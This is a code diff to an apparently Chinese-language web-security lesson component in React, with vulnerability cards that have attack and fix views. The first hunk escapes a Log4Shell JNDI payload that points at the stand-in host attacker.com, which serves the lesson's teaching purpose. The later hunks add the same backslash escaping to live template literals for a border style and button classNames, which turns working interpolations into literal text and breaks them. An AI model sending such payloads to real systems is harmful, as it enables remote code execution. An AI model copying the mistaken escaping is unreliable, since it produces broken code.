@@ -129,7 +129,7 @@ async def generic_error(req, exc):
     desc: '使用含已知漏洞的依赖库（Log4Shell/Struts2等CVE导致数百万系统被入侵）',
     attack: `# Log4Shell（CVE-2021-44228）——史上最严重漏洞之一
 # 仅需一行日志输入即可 RCE（远程代码执行）：
-${jndi:ldap://attacker.com/exploit}
+\${jndi:ldap://attacker.com/exploit}
 
 # requests 库旧版 SSRF 漏洞
 # Pillow 远程代码执行漏洞
@@ -289,7 +289,7 @@ export default function LessonWebSec() {
               <div key={i} onClick={() => setActiveVuln(i)}
                 style={{ padding: '0.6rem 0.75rem', borderRadius: '8px', cursor: 'pointer', marginBottom: '0.3rem', display: 'flex', gap: '0.5rem', alignItems: 'center', transition: 'all 0.15s',
                   background: activeVuln === i ? 'rgba(220,38,38,0.1)' : 'rgba(255,255,255,0.02)',
-                  border: `1px solid ${activeVuln === i ? 'rgba(220,38,38,0.4)' : 'rgba(255,255,255,0.05)'}` }}>
+                  border: `1px solid \${activeVuln === i ? 'rgba(220,38,38,0.4)' : 'rgba(255,255,255,0.05)'}` }}>
                 <span className={`sec-sev ${vuln.sev}`} style={{ fontSize: '0.6rem', minWidth: 28 }}>{vuln.rank}</span>
                 <span style={{ fontSize: '0.75rem', color: activeVuln === i ? '#f87171' : '#5a1a1a', fontWeight: activeVuln === i ? 700 : 400 }}>{vuln.name}</span>
               </div>
@@ -305,8 +305,8 @@ export default function LessonWebSec() {
             <div style={{ fontSize: '0.82rem', color: '#5a1a1a', marginBottom: '0.75rem' }}>{v.desc}</div>
 
             <div style={{ display: 'flex', gap: '0.4rem', marginBottom: '0.5rem' }}>
-              <button className={`sec-btn ${view === 'attack' ? 'attack' : ''}`} onClick={() => setView('attack')}>⚔️ 攻击示例</button>
-              <button className={`sec-btn defense ${view === 'fix' ? 'active' : ''}`} onClick={() => setView('fix')}>🛡 修复代码</button>
+              <button className={`sec-btn \${view === 'attack' ? 'attack' : ''}`} onClick={() => setView('attack')}>⚔️ 攻击示例</button>
+              <button className={`sec-btn defense \${view === 'fix' ? 'active' : ''}`} onClick={() => setView('fix')}>🛡 修复代码</button>
             </div>
 
             <div className="sec-terminal">
